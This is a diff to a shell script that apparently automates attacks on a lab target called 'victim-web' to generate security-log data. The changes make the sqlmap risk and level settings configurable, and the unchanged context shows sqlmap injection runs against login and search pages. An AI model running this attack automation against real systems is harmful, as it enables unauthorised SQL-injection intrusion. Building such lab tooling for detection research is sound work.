@@ -10,12 +10,20 @@ echo "[$(date)] Starting SecurityLogs Attack Execution..."
 # Load environment variables
 source /opt/.env 2>/dev/null || true
 
+# Load YAML configuration if available
+if [ -f "/opt/scripts/config_loader.py" ]; then
+    # Export YAML config as environment variables
+    python3 /opt/scripts/config_loader.py --variant "${SCENARIO_VARIANT:-moderate}" --export
+fi
+
 # Set default values
 TARGET_HOST=${TARGET_HOST:-"victim-web"}
 TARGET_URL=${TARGET_URL:-"http://victim-web"}
 NMAP_RATE=${NMAP_RATE:-0.016}
 SQL_DELAY=${SQL_DELAY:-120}
 SQLMAP_THREADS=${SQLMAP_THREADS:-1}
+SQLMAP_RISK=${SQLMAP_RISK:-1}
+SQLMAP_LEVEL=${SQLMAP_LEVEL:-1}
 
 echo "[$(date)] Configuration:"
 echo "  Target Host: $TARGET_HOST"
@@ -23,6 +31,8 @@ echo "  Target URL: $TARGET_URL"
 echo "  NMAP Rate: $NMAP_RATE packets/sec"
 echo "  SQL Delay: $SQL_DELAY seconds"
 echo "  SQLMap Threads: $SQLMAP_THREADS"
+echo "  SQLMap Risk: $SQLMAP_RISK"
+echo "  SQLMap Level: $SQLMAP_LEVEL"
 
 # Wait for target to be ready
 echo "[$(date)] Waiting for target to be ready..."
@@ -78,8 +88,8 @@ sqlmap -u "$TARGET_URL/login.php?user=*&pass=*" \
     --threads="$SQLMAP_THREADS" \
     --delay="$SQL_DELAY" \
     --time-sec=10 \
-    --risk=1 \
-    --level=1 \
+    --risk="$SQLMAP_RISK" \
+    --level="$SQLMAP_LEVEL" \
     --output-dir=/opt/output/sqlmap_login
 
 echo "[$(date)] Running SQLMap against search form..."
@@ -90,8 +100,8 @@ sqlmap -u "$TARGET_URL/search.php?q=*" \
     --threads="$SQLMAP_THREADS" \
     --delay="$SQL_DELAY" \
     --time-sec=10 \
-    --risk=1 \
-    --level=1 \
+    --risk="$SQLMAP_RISK" \
+    --level="$SQLMAP_LEVEL" \
     --output-dir=/opt/output/sqlmap_search
 
 # Phase 5: Advanced Exploitation
